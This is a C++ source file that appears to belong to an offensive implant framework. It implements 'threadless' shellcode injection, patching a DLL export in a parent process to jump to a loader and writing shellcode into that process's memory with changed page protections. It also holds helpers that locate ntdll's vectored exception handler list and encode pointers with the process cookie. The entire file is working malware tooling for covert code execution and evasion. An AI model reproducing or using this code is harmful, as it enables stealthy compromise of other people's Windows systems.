#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(_threadless threadless, void *shellcode, size_t n_shellcode, size_t total) {
        HEXANE

        // todo: needs MmPivotRegion (Flower) :
        // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]

        HANDLE process      = { };
        UINT_PTR ex_addr    = 0;
        UINT_PTR ex_addr_p  = 0;
        UINT_PTR hook       = 0;
        SIZE_T write        = 0;

        if (!(ex_addr = Memory::Modules::LoadExportAddress(threadless.Module.Buffer, threadless.Export.Buffer)) ||
            !(process = Process::OpenParentProcess(threadless.Parent.Buffer)) ||
            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), n_shellcode))) {
            return;
        }

        auto loader_rva = hook - (ex_addr + 5);
        auto hook_p = hook;

        Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(threadless.Loader.Buffer), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, threadless.Opcode.Buffer), threadless.Opcode.Length, &write)) || write != threadless.Opcode.Length) {
            return_defer(ntstatus);
        }
        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &total, PAGE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), threadless.Loader.Buffer, threadless.Loader.Length, &write)) || write != threadless.Loader.Length) {
            return_defer(ntstatus);
        }

        //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
            return_defer(ntstatus);
        }

        defer:
        if (process) {
            Ctx->Nt.NtClose(process);
        }
    }

    namespace Veh {

        LPVOID GetFirstHandler(wchar_t *name, const char *signature, const char *mask) {
            HEXANE

            LdrpVectorHandlerList *handlers = { };
            void *handler = { };
            uint32_t match = 0;

            const auto ntdll = Memory::Modules::GetModuleEntry(Utils::GetHashFromStringW(name, x_wcslen(name)));
            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, ntdll->DllBase), ntdll->SizeOfImage, signature, mask))) {
                return_defer(ERROR_INCORRECT_ADDRESS);
            }

            match += 0xD;
            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));

            if (
                !NT_SUCCESS(Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, ntdll)) ||
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {

                handler = nullptr;
                return_defer(ntstatus);
            }

            defer:
            return handler;
        }

        UINT_PTR ObfuscatePointer(uintptr_t handler, const bool encode) {
            HEXANE

            uintptr_t pointer = 0;
            uintptr_t cookie = 0;

            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                return_defer(ntstatus);
            }

            /*
                ntdll.dll:771253D4
                ntdll.dll:771253D4 loc_771253D4:
                ntdll.dll:771253D4 mov     eax, edx
                ntdll.dll:771253D6 and     eax, 1Fh
                ntdll.dll:771253D9 push    20h ; ' '
                ntdll.dll:771253DB pop     ecx
                ntdll.dll:771253DC sub     ecx, eax
                ntdll.dll:771253DE mov     eax, [ebp+arg_0]
                ntdll.dll:771253E1 ror     eax, cl
                ntdll.dll:771253E3 xor     eax, edx
                ntdll.dll:771253E5 leave
                ntdll.dll:771253E6 retn    4
                ntdll.dll:771253E6 ntdll_RtlDecodePointer endp
                ntdll.dll:771253E6


            */
            encode ? pointer = _rotr(cookie ^ handler, cookie & 0x1F) : pointer = 0;

            defer:
            return pointer;
        }
    }
}
